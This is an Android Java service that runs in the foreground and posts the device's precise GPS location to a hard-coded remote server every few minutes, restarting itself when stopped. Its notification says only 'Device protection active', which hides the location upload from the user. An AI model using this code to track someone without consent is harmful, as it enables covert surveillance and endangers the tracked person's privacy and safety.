package com.ezednyanuga.tracker;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.location.*;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LocationService extends Service {
    private FusedLocationProviderClient client;
    private LocationCallback callback;
    private final String SERVER_URL = "https://tracking-4lwo.onrender.com/update";

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, createNotification());
        client = LocationServices.getFusedLocationProviderClient(this);
        startTracking();
    }

    private Notification createNotification() {
        String id = "ezed_tracker";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(id, "EZED Tracker", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, id)
                .setContentTitle("EZED NYANUGA TECH")
                .setContentText("Device protection active")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setOngoing(true)
                .build();
    }

    private void startTracking() {
        LocationRequest req = LocationRequest.create()
                .setInterval(300000)
                .setFastestInterval(60000)
                .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        callback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult result) {
                Location loc = result.getLastLocation();
                if (loc != null) sendToServer(loc);
            }
        };

        client.requestLocationUpdates(req, callback, Looper.getMainLooper());
    }

    private void sendToServer(Location loc) {
        new Thread(() -> {
            try {
                JSONObject json = new JSONObject();
                json.put("lat", loc.getLatitude());
                json.put("lng", loc.getLongitude());
                json.put("acc", Math.round(loc.getAccuracy()));
                
                HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                OutputStream os = conn.getOutputStream();
                os.write(json.toString().getBytes());
                os.flush();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
